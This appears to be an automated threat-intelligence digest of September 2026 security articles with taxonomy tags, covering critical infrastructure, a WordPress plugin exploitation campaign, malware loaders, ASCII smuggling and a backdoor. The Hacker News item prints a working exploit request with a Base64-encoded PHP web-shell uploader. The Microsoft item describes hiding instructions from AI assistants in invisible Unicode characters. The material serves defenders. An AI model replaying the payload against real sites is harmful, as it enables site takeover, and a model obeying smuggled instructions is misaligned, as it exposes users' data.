  - Summary: Stop manual asset inventory. RADAR automatically discovers all internet-facing infrastructure and filters for CISA KEVs within seconds. Get a prioritized, actionable list of risks. Learn how.

### Cluster f7ce25a96b — score 11

- Title: Protecting Critical National Infrastructure (CNI) through extended global visibility
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-04T13:13:53+00:00
- Link: https://www.team-cymru.com/post/protecting-critical-national-infrastructure-orb-networks
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Adversaries are pre-positioning for destructive attacks on CNI. Learn how to track nation-state threat actors and ORB networks to harden the OT boundary "left of boom."
```

#### Full body

```
4 min read February 17, 2026 Protecting Critical National Infrastructure (CNI) through extended global visibility Team Cymru offers a range of capabilities specifically tailored to protect Industrial Control Systems (ICS) and Operational Technology (OT), which over the years have been increasingly targeted by hostile nation-state threat actors as well as lesser skilled “hacktivist” groups. Unlike standard IT environments, OT systems often utilize legacy protocols and have long equipment lifecycles, making proactive external visibility essential. By focusing on the networking stages of the ICS version of the MITRE ATT&CK framework using Team Cymru’s visibility, specifically Reconnaissance and Command and Control, OT defenders can identify scanning and exploitation attempts against exposed infrastructure and track malicious infrastructure before attackers can establish persistence. Cybersecurity industry experts continue to warn that critical national infrastructure (CNI) sector organizations need to enhance their visibility into their own remote facilities and technical OT system. "Utilities need to treat external exposure and asset blind spots as intelligence problems, not just configuration issues. Energy-sector OT environments are becoming increasingly exposed as legacy systems connect to modern networks without corresponding gains in visibility or monitoring. What stands out in these findings is how quickly serious risks emerge once traffic is observed, suggesting attackers are likely identifying the same weaknesses just as fast. Closing these gaps requires continuous visibility into OT communications and the context to understand what ‘normal’ behavior actually looks like.” - Will Baxter, Field CISO at Team Cymru. "The recent Poland attacks confirmed that the adversary doesn't just teleport to the perimeter; they 'commute' via Operational Relay Boxes (ORBs) to pre-position themselves months in advance. Tracking this external infrastructure allows defenders to spot the threat left of boom, burning the adversary's bridge before they can cross it to deliver kinetic effects. To survive a sophisticated campaign, we cannot operate with blind spots; we need external telemetry to track the adversary's intent and internal deep-packet inspection to catch their specific 'living off the land' tactics. External visibility tells you who is knocking at the gate, while internal visibility is the only way to see what physical process they are attempting to disrupt once inside and capturing transient data for root cause analysis afterwards." - Mark (Magpie) Graham of Dragos Inc. Evolutions of the ICS and OT Threat Landscape in 2025 To help track the evolution of ICS/OT threats, Team Cymru researchers supported the development of the Cyber Incident Tracker for Electric Power Systems (CITEPS), a project created by Prof. Dr. Luiz F. Freitas-Gutierres. The evolution of ICT/OT threats can be marked by two main eras. The first era involves adversaries experimenting with these sophisticated digital weapons. The second era can be marked by an increasing usage and adoption of these capabilities by adversaries, often attributed to nation-state intelligence services. 2010–2019: The Era of Experimentation This period marked the introduction of specialized digital weapons targeting ICS, leading to a mix of espionage and destructive attacks. This includes the deployment of Stuxnet in 2010, which is noted as the world’s first publicly known digital weapon against ICS, physically destroying centrifuges at the Natanz nuclear facility in Iran. Subsequent malware became more specialized, such as Industroyer which was used in the 2016 Ukraine power grid attack to disrupt electricity, a critical event that signaled a shift toward direct grid manipulation. The ceiling was raised further in 2017 with Triton malware, which specifically targeted safety instrumented systems at a Saudi Arabian petrochemical plant, threatening physical safety mechanisms and threatenin
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Protecting Critical National Infrastructure (CNI) through extended global visibility
  - Published: 2026-09-04T13:13:53+00:00
  - Link: https://www.team-cymru.com/post/protecting-critical-national-infrastructure-orb-networks
  - Summary: Adversaries are pre-positioning for destructive attacks on CNI. Learn how to track nation-state threat actors and ORB networks to harden the OT boundary "left of boom."

### Cluster 0be1df44fd — score 11

- Title: Webmin Vulnerability and Port Scanning Activity
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-03T18:58:23+00:00
- Link: https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ransomware_extortion
- actor_attribution: Cl0p, ShinyHunters
- affected_industries: manufacturing_industrial
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, apt_espionage
- actor_attribution: ShinyHunters, Cl0p
- affected_industries: manufacturing_industrial
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Stay ahead of cyber threats with our in-depth analysis of the Webmin vulnerability and port scanning activity. Protect your technology company now!
```

#### Full body

```
3 min read The Transaction Is the Last Step, Not the First Eli Woodward 5 min read Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days Stephen Campbell 5 min read Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry Josh Picolet 3 min read From C2 Detection to Possible Victim Identification Abigail Lorion 2 min read Modernizing Incident Response: 4 Steps to Bulletproof Your Windows Logging Abigail Lorion 4 min read min read Cybercrime Doesn't Reinvent Itself. It Optimizes. Abigail Lorion 3 min read min read The Unclosed Gap: Why the 2026 DBIR Proves the Decisive Battle Happens Before the First Internal Alert Stephen Campbell 5 min read min read Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning Eli Woodward 3 min read Unmasking DPRK Cyber Threat Actors: Fake IT Worker Infrastructure & Post-Exposure Analysis Eli Woodward 3 min read Cyber Security Intelligence: Analysis of Edge Devices Amid Growing Vulnerabilities Will Thomas 5 min read Stranger Strings: Yurei Ransomware Operator Toolkit Exposed Will Thomas 5 min read Industrial Cybersecurity Risks from Internet-Exposed ICS Devices Next The latest articles straight to your inbox
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Webmin Vulnerability and Port Scanning Activity
  - Published: 2026-09-03T18:58:23+00:00
  - Link: https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
  - Summary: Stay ahead of cyber threats with our in-depth analysis of the Webmin vulnerability and port scanning activity. Protect your technology company now!

### Cluster ffad5d9316 — score 11

- Title: Threat Intelligence: A CISO ROI Guide - Prevent Data Breaches
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-03T18:58:23+00:00
- Link: https://www.team-cymru.com/post/threat-intelligence-a-ciso-roi-guide-prevent-data-breaches
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, supply_chain
- affected_industries: retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, data_breach
- affected_industries: retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Summary

```
Uncover the power of threat intelligence for a technology company. Learn how to prevent data breaches and maximize ROI as a CISO with expert guidance.
```

#### Full body

```
tcblogposts 4 min read March 15, 2023 Threat Intelligence: A CISO ROI Guide - Prevent Data Breaches Threat Reconnaissance that Saves your Butt and the Budget Threat hunting and reconnaissance often seems like another hard to explain cybersecurity budget item, especially when talking to business counterparts. As a CISO, you know that having an elite team of threat hunters focused on your external attack surface saves the company from a compromise or attack. External threat hunters have the visibility to monitor threat actor infrastructure, see how it evolves, and shut down any communication going to hackers. You know how important this capability is to safeguard the organization, but how about the rest of the company? Spoiler alert: over the next five parts of this series, we’re going to explain in simple terms how an elite group of threat hunters using Pure Signal Recon were able to effect a total $9m in savings. This threat hunting team supported cybersecurity needs for key business initiatives and helped their company realize a three year risk reduction savings of $9m. Half of the $9m in savings can be attributed to avoiding a data breach in the first place, so let’s start our discussion with the biggest area of cost savings and risk reduction. We’ll start where the largest savings were found, with $4.5m of the $9m being attributed to data breach avoidance. Data Breaches - Proactive Approach for Payback As a real world example we are going to examine the hard dollars that a large multinational retailer saved with their investment in Pure Signal Recon to empower their analysts with unmatched threat hunting and reconnaissance capabilities. This is a company with a mature cybersecurity team that provides cybersecurity defenses to protect a 1m+ workforce, a global corporate organization with an extensive supply chain and ongoing M&A activity. This write up is based on the original Forrester Total Economic Impact™ (TEI) study, an independently held private collaboration between our client and them. The goals were to determine the cost savings gains that could be achieved by using external threat reconnaissance to support a proactive cybersecurity organization to safeguard company reputation, share value, and careers, from cyber risks. Defining the ROI of Threat Reconnaissance - What Matters Most With access to the proper tools, threat hunting empowers analysts to act on threats to your organization in real time, instead of the usual reactive responses that drain resources and budget. It opens up a new range of preemptive capabilities that can turn your threat analysts into a powerful layer of proactive cyber defense.It has When justifying budgets and helping the business understand the importance of your threat hunting function consider where it has direct impact on business outcomes: Stop a data breach from happening with a predictive response to persistent threat actors Reduce the amount of tools needed and lower the swivel chair security tax on your analysts Detect impending data breaches via your supply chain and other 3rd parties Address the business risk of new company acquisitions via M&A Remove tedious analyst work with automation so they could focus on strategic cybersecurity initiatives Predictive Response Pays Off First we will focus on the most obvious area where improved threat intelligence pays off; preventing data breaches from happening in the first place . In this real world scenario, we are profiling a sophisticated cybersecurity team that could already show that they were able to reduce the standard cost of a data breach by more than 75%. As a retail conglomerate and global brand, they are highly targeted and sought after “prize” with threat actors. They wanted to close the gap by another 40% reduction in projected costs due to a data breach. The team had the skills and experience to further close the gap on corporate risk and cost by transitioning from providing reactive cybersecurity to a more proactive respo
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Threat Intelligence: A CISO ROI Guide - Prevent Data Breaches
  - Published: 2026-09-03T18:58:23+00:00
  - Link: https://www.team-cymru.com/post/threat-intelligence-a-ciso-roi-guide-prevent-data-breaches
  - Summary: Uncover the power of threat intelligence for a technology company. Learn how to prevent data breaches and maximize ROI as a CISO with expert guidance.

### Cluster 88364fe6d8 — score 11

- Title: Research Shows Number of Potentially Compromised Organizations More than Doubles Since January
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-03T18:58:21+00:00
- Link: https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ransomware_extortion
- actor_attribution: Cl0p, ShinyHunters
- affected_industries: manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, apt_espionage
- actor_attribution: ShinyHunters, Cl0p
- affected_industries: manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover the alarming rise in compromised organizations since January. Learn how this impacts technology companies and what steps can be taken to mitigate the risks.
```

#### Full body

```
3 min read The Transaction Is the Last Step, Not the First Eli Woodward 5 min read Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days Stephen Campbell 5 min read Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry Josh Picolet 3 min read From C2 Detection to Possible Victim Identification Abigail Lorion 2 min read Modernizing Incident Response: 4 Steps to Bulletproof Your Windows Logging Abigail Lorion 4 min read min read Cybercrime Doesn't Reinvent Itself. It Optimizes. Abigail Lorion 3 min read min read The Unclosed Gap: Why the 2026 DBIR Proves the Decisive Battle Happens Before the First Internal Alert Stephen Campbell 5 min read min read Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning Eli Woodward 3 min read Unmasking DPRK Cyber Threat Actors: Fake IT Worker Infrastructure & Post-Exposure Analysis Eli Woodward 3 min read Cyber Security Intelligence: Analysis of Edge Devices Amid Growing Vulnerabilities Will Thomas 5 min read Stranger Strings: Yurei Ransomware Operator Toolkit Exposed Will Thomas 5 min read Industrial Cybersecurity Risks from Internet-Exposed ICS Devices Next The latest articles straight to your inbox
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Research Shows Number of Potentially Compromised Organizations More than Doubles Since January
  - Published: 2026-09-03T18:58:21+00:00
  - Link: https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
  - Summary: Discover the alarming rise in compromised organizations since January. Learn how this impacts technology companies and what steps can be taken to mitigate the risks.

### Cluster 9ebfca707c — score 11

- Title: Over 440,000 Exploit Attempts Target Super Forms and Elementor Pro RCE Flaws
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-04T08:48:45+00:00
- Link: https://thehackernews.com/2026/09/over-440000-exploit-attempts-target.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-14894, WordPress

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_products: WordPress
- cve_ids: CVE-2026-14894, CVE-2026-32475
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_products: WordPress
- cve_ids: CVE-2026-14894, CVE-2026-32475
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors are exploiting two critical security flaws in WordPress plugins Super Forms and Elementor Pro, according to findings from Wordfence. The vulnerabilities in question are - CVE-2026-14894 (CVSS score: 9.8) - A missing file type validation vulnerability in Super Forms – Drag & Drop Form Builder that allows unauthenticated attackers to upload files of any type, including
```

#### Full body

```
Over 440,000 Exploit Attempts Target Super Forms and Elementor Pro RCE Flaws  Ravie Lakshmanan  Sep 04, 2026 Vulnerability / Web Security Threat actors are exploiting two critical security flaws in WordPress plugins Super Forms and Elementor Pro, according to findings from Wordfence. The vulnerabilities in question are - CVE-2026-14894 (CVSS score: 9.8) - A missing file type validation vulnerability in Super Forms – Drag & Drop Form Builder that allows unauthenticated attackers to upload files of any type, including executable PHP files, leading to remote code execution. (Fixed in version 6.3.314) CVE-2026-32475 (CVSS score: 9.0/9.8) - A vulnerability in Elementor Pro that allows unauthenticated attackers to upload files of any type, including executable PHP files, leading to remote code execution. (Fixed in version 4.2.2) As with arbitrary file upload vulnerabilities of this kind, an attacker can leverage them to write a PHP web shell to the site and execute arbitrary code, which can then be abused to create administrator accounts, exfiltrate data, or seize control of the entire WordPress site. It's worth noting that details about CVE-2026-32475 were disclosed by Patchstack last month. Successful exploitation requires the target site to have at least one published Elementor page containing a Form widget with a File Upload field. In a pair of reports published this week, Wordfence said it has already blocked over 250,000 and 190,000 exploit attempts targeting CVE-2026-14894 and CVE-2026-32475, respectively. Exploitation Against CVE-2026-14894 In the attacks exploiting CVE-2026-14894, threat actors have been found to issue an HTTP POST request to "/wp-admin/admin-ajax.php" using the "super_submit_form" endpoint containing a file field with a Base64-encoded PHP payload and an attacker-controlled file name as below - action=super_submit_form&form_id=2&sf_nonce=04c3aa2046&data={"sf_upload_field": {"type": "files", "files": [{"datauristring": "data:image/gif;base64,PD9waHAgaWYoaXNzZXQoJF9GSUxFU1siZmlsZSJdKSl7JHRhcmdldD1iYXNlbmFtZSgkX0ZJTEVTWyJmaWxlIl1bIm5hbWUiXSk7aWYobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImZpbGUiXVsidG1wX25hbWUiXSwkdGFyZ2V0KSl7ZWNobyLinIUgVXBsb2FkZWQ6IDxhIGhyZWY9JyR0YXJnZXQnPiR0YXJnZXQ8L2E+Ijt9ZWxzZXtlY2hvIuKdjCBVcGxvYWQgZmFpbGVkISI7fWV4aXQ7fT8+PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPk11c2hyMDB3IFVwbG9hZGVyPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9ImJhY2tncm91bmQ6IzBhMGEwYTtjb2xvcjojMDBmZjAwO2ZvbnQtZmFtaWx5Om1vbm9zcGFjZTtkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7aGVpZ2h0OjEwMHZoO21hcmdpbjowOyI+PGZvcm0gbWV0aG9kPSJQT1NUIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBzdHlsZT0iYmFja2dyb3VuZDojMTExO3BhZGRpbmc6NDBweDtib3JkZXI6MnB4IHNvbGlkICMwMGZmMDA7Ym9yZGVyLXJhZGl1czoxMHB4O3RleHQtYWxpZ246Y2VudGVyOyI+PGgyPvCfk6QgVVBMT0FEPC9oMj48aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgcmVxdWlyZWQgc3R5bGU9ImJhY2tncm91bmQ6IzBhMGEwYTtjb2xvcjojMDBmZjAwO2JvcmRlcjoxcHggc29saWQgIzAwZmYwMDtwYWRkaW5nOjEwcHg7Ym9yZGVyLXJhZGl1czo1cHg7Ij48YnI+PGJyPjxidXR0b24gdHlwZT0ic3VibWl0IiBzdHlsZT0iYmFja2dyb3VuZDojMDBmZjAwO2NvbG9yOiMwYTBhMGE7cGFkZGluZzoxMHB4IDMwcHg7Ym9yZGVyOm5vbmU7Ym9yZGVyLXJhZGl1czo1cHg7Zm9udC13ZWlnaHQ6Ym9sZDtjdXJzb3I6cG9pbnRlcjsiPuKshiBVcGxvYWQ8L2J1dHRvbj48L2Zvcm0+PC9ib2R5PjwvaHRtbD4=", "value": "Mushr00w_upl.php", "name": "Mushr00w_upl.php", "label": "attachment"}]}} The uploaded file, while prefixed with the "data:image/gif;base64" content type, is a PHP file-uploader web shell ("Mushr00w_upl.php"), which then acts as a conduit to upload additional payloads to the site. Attacks weaponizing the Super Forms plugin have originated from the following IP addresses - 103.168.147.235 103.168.146.131 103.154.152.178 103.170.97.7 182.10.130.51 189.4.122.140 129.227.46.143 64.176.209.104 103.164.182.122 37.9.33.62 The malicious activity is said to have begun on July 14, 2026, before scaling a peak of more than 40,000 exploit requests on August 18, 2026. Exploitation Against CVE-2026-32475 "The attacker submits the form's File Up
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Over 440,000 Exploit Attempts Target Super Forms and Elementor Pro RCE Flaws
  - Published: 2026-09-04T08:48:45+00:00
  - Link: https://thehackernews.com/2026/09/over-440000-exploit-attempts-target.html
  - Summary: Threat actors are exploiting two critical security flaws in WordPress plugins Super Forms and Elementor Pro, according to findings from Wordfence. The vulnerabilities in question are - CVE-2026-14894 (CVSS score: 9.8) - A missing file type validation vulnerability in Super Forms – Drag & Drop Form Builder that allows unauthenticated attackers to upload files of any type, including

### Cluster 0a6ef11865 — score 10

- Title: Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure
- Source: Unit 42 (threat_research_primary)
- Published: 2026-09-09T10:00:55+00:00
- Link: https://unit42.paloaltonetworks.com/ppi-network-malware-campaign-analysis/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_industries: critical_infrastructure, government
- affected_products: Palo Alto Networks
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_industries: government, critical_infrastructure
- affected_products: Palo Alto Networks
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
An investigation into how cybercriminals used YouTube gaming lures and SEO poisoning to deliver multi-payload malware to enterprise networks. The post Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Malware Malware Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure 18 min read Related Products Advanced DNS Security Advanced URL Filtering Advanced WildFire Cloud-Delivered Security Services Cortex Cortex XDR Cortex XSIAM Unit 42 Incident Response By: Rem Dudas Published: September 9, 2026 Categories: Malware Threat Research Tags: ARKTunnel C2 CL-CRI-1171 Docro Hijacker Pay-per-install Payload Share Executive Summary A recent Unit 42 investigation into seemingly low-priority enterprise infections demonstrates how the most effective camouflage in cybercrime is not necessarily in the use of sophisticated techniques, but in how unremarkable the threat appears. The activities that we investigated would typically not require escalation or further inquiry. But upon closer inspection, we discovered a massive cybercrime campaign largely targeting young gamers. Tracked as CL-CRI-1171, in accordance with Unit 42’s attribution framework , the group behind this cluster has operated under the radar for at least two years, distributing an indeterminate number of payloads. The group behind CL-CRI-1171 provides an infection service for other threat actors who want to spread their malware indiscriminately. This pay-per-install (PPI) marketplace drove hundreds of infections through YouTube channels and a parallel search engine optimization (SEO)-poisoning funnel, all using the same custom loader. We observed at least eleven YouTube channels that had hundreds of thousands of followers. We notified YouTube of these channels, which it promptly terminated. These channels were actively interacting with viewers to promote gaming content laced with links to download malware. Content in the channels included advice on improving frame rates, fixing game crashes and adjusting settings on game platforms. Although the videos provided real content for gamers, they also served as the delivery vehicle for infection, prompting viewers to download malicious tools. The SEO funnel targeted a more professional audience, promoting trojanized software that resulted in malware deployment on corporate endpoints, including critical infrastructure and even government entities. We identified three independent payloads delivered by the same loader between July 2025 and April 2026: two never publicly reported, Docro Hijacker and ARKTunnel, and a new variant of a previously unnamed backdoor, which we dubbed Insomnia remote access Trojan (RAT). These infections represent only a small sample of a much larger deployment campaign. We have identified more than 10,000 distinct loader samples, each capable of delivering unique payload combinations. We provide an overview of the cybercrime cluster and its loader infrastructure, and a technical analysis of three recently delivered malware strains. Palo Alto Networks customers are better protected from the threats discussed in this article through the following: Advanced WildFire Advanced URL Filtering and Advanced DNS Security Cortex XDR and XSIAM If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics SEO Poisoning , Browser Hijacking , RATs Overview of CL-CRI-1171 Activity Our discovery of two separate infections delivering three entirely distinct malware families revealed one common denominator: a shared loader. By tracing this infrastructure, we mapped the broader activity of CL-CRI-1171, ultimately tying the cluster to a PPI marketplace responsible for delivering countless payloads over the last two years. This operation uses at least two funneling mechanisms to route traffic to the malware landing pages: a network of YouTube channels and SEO poisoning . The shared infrastructure between the YouTube and SEO funnels, consistent use of the same loader and a rotational domain pattern observed over an eight-month window all pointed to a single sustained operation, which we track as CL-CRI
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure
  - Published: 2026-09-09T10:00:55+00:00
  - Link: https://unit42.paloaltonetworks.com/ppi-network-malware-campaign-analysis/
  - Summary: An investigation into how cybercriminals used YouTube gaming lures and SEO poisoning to deliver multi-payload malware to enterprise networks. The post Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure appeared first on Unit 42 .

### Cluster 2e696487bb — score 10

- Title: ASCII smuggling crosses over from AI prompt injection to phishing evasion
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-03T16:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/03/ascii-smuggling-crosses-over-from-ai-prompt-injection-to-phishing-evasion/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security, data_breach, phishing_social_eng
- affected_industries: financial_services
- affected_products: Microsoft 365, Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, data_breach, ai_security
- affected_industries: financial_services
- affected_products: Microsoft 365, Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Invisible Unicode characters popularized for hiding instructions from AI models are now being used to obfuscate words before email filters parse them. The post ASCII smuggling crosses over from AI prompt injection to phishing evasion appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Phishing Social engineering Content types Research Products and services Microsoft Defender Topics Actionable threat insights AI and agents Threat intelligence Microsoft researchers observed a high-volume phishing campaign using invisible Unicode tag characters , a technique popularized in AI prompt injection research as ASCII Smuggling . Instead of using these characters to hide instructions from people while exposing them to AI models, the attacker used them to split financial lure words such as ‘funding’ to prevent email filters from parsing them. The finding emerged from Microsoft Defender for Office 365 prompt injection protection research, showing how AI-era evasion techniques can surface in traditional phishing campaigns. In Microsoft telemetry, hits on a hunting signature designed to detect ASCII-smuggling increased sharply beginning February 9, 2026, and remained elevated on weekdays for approximately three months. Microsoft Defender for Office 365 telemetry showed that the majority of messages were flagged by layered protections rather than by reliance on a single Unicode-specific signal. What is ASCII smuggling? “ASCII smuggling” refers to the use of invisible or non-rendering Unicode characters to hide content inside text that looks normal. The most abused range is the Unicode Tags block, U+E0000 to U+E007F. This block contains a shadow copy of the printable ASCII characters (for example, U+E0041 mirrors ‘A’, U+E0061 mirrors ‘a’). The block was originally intended for language tagging and is now largely deprecated. The important property for an attacker is this: most of these code points are not rendered by typical fonts and user interfaces. A string can therefore carry a message that is not readable to a human but will be processed by any language model or other software that receives a copy of the email content. Why the AI-security world made it famous Over the past year, ASCII smuggling became a recurring technique in the prompt injection and cross-prompt injection (XPIA) literature. The attack pattern is straightforward: An attacker hides instructions inside invisible tag characters embedded in a web page, document, email, or other content. A human (and many user interfaces) sees nothing unusual. An AI assistant that ingests the raw text does “see” the hidden characters, decodes them as text, and may be induced to follow threat actor-controlled instructions, potentially including data exposure or unauthorized actions depending on the assistant’s permissions and safeguards. Because this technique cleanly demonstrates the gap between what the human sees and what the model reads, it appeared frequently in AI red-teaming write-ups, conference talks, and tooling throughout 2025. That attention put a spotlight on the U+E0000-U+E007F range. Because tag characters are invisible to humans but exist at the text-processing level, the same property that makes them useful for smuggling instructions into a model also makes them useful for obfuscating keywords before a detector evaluates them . The intent is inverted, but the mechanism is similar and a user’s suspicions are not raised. Writing a practical ASCII-smuggling signature As part of work on Microsoft Defender for Office 365 prompt injection protection, we built hunting logic for email-borne XPIA and prompt obfuscation patterns: content that looks harmless to users but may carry hidden instructions for an AI system that ingests the raw message. The same hunt designed to identify prompt injection risk in email became the starting point for this phishing-evasion discovery. One practical way to hunt for ASCII smuggling is to look for messages carrying characters from the Unicode tags block (U+E0000-U+E007F), the hallmark of attempts to hide instructions from, or for, an AI model. That broad signature is a useful starting point, but it needs enough Unicode context to avoid mistaking legitimate tag-character sequences for abuse. The fir
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: ASCII smuggling crosses over from AI prompt injection to phishing evasion
  - Published: 2026-09-03T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/03/ascii-smuggling-crosses-over-from-ai-prompt-injection-to-phishing-evasion/
  - Summary: Invisible Unicode characters popularized for hiding instructions from AI models are now being used to obfuscate words before email filters parse them. The post ASCII smuggling crosses over from AI prompt injection to phishing evasion appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: ASCII smuggling crosses over from AI prompt injection to phishing evasion
  - Published: 2026-09-03T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/03/ascii-smuggling-crosses-over-from-ai-prompt-injection-to-phishing-evasion/
  - Summary: Invisible Unicode characters popularized for hiding instructions from AI models are now being used to obfuscate words before email filters parse them. The post ASCII smuggling crosses over from AI prompt injection to phishing evasion appeared first on Microsoft Security Blog .

### Cluster 439827e1a6 — score 10

- Title: Angry Birds: Toy Ghouls’ new toys
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-09-04T10:00:05+00:00
- Link: https://securelist.com/toy-ghouls-new-hivemq-and-element-backdoors/121270/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, web_shell_backdoor
- actor_attribution: LockBit
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, web_shell_backdoor
- actor_attribution: LockBit
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Kaspersky GERT experts have discovered new backdoors used by the Toy Ghouls group. One version of the backdoor uses the HiveMQ MQTT broker as its command-and-control server; the other uses the Matrix-based Element messenger.
```

#### Full body

```
Table of Contents Introduction Technical details Delivery Installation Communication Takeaways Indicators of compromise Authors Kaspersky GERT Kaspersky Security Services Introduction We continue tracking the activity of Toy Ghouls (also known as Bearlyfy, Laboo.boo, and Feral Wolf), a financially motivated group that has been targeting Russian organizations since 2025. The attackers initially relied exclusively on tools pulled from public GitHub repositories along with leaked Babuk and LockBit ransomware builders, later shifting to their own custom ransomware, GenieLocker . In early July 2026, we observed the group using a custom backdoor for the first time. We identified two versions of this backdoor: one uses the HiveMQ MQTT broker as its C2 server, while the other relies on the Element messenger. Both versions include “bird” in their names: mqtt-bird-agent 0.1.0 (HiveMQ version) matrix-bird-agent 0.1.0 (Element version) This post examines how the backdoor is delivered to target systems, how it establishes persistence, and how it communicates with its C2 server. Technical details Delivery In this campaign, the attackers use Windows Remote Management (WinRM) to deliver the backdoors and their configuration files to compromised systems. The group relies on open-source tools such as Evil-WinRM and WinRM-fs to do this. Installation The backdoor can both run within an interactive command-line session and establish persistence as a Windows service, using the --install or install option, depending on the backdoor version. The --service (or service ) option is not available by default and is instead used as an argument for the installed Windows service. Other launch options are listed in the backdoor’s help output: C:\cplsupport.exe -h Bird Agent - MQTT server monitor Usage: cplsupport.exe [OPTIONS] Options: -c, --config <CONFIG> Path to config.toml config file --install Install as a system service --uninstall Uninstall the system service --seal Encrypt sensitive config fields in-place using a machine-bound key -h, --help Print help -V, --version Print version 1 2 3 4 5 6 7 8 9 10 11 C : \ cplsupport . exe - h Bird Agent - MQTT server monitor Usage : cplsupport . exe [ OPTIONS ] Options : - c , -- config < CONFIG > Path to config . toml config file -- install Install as a system service -- uninstall 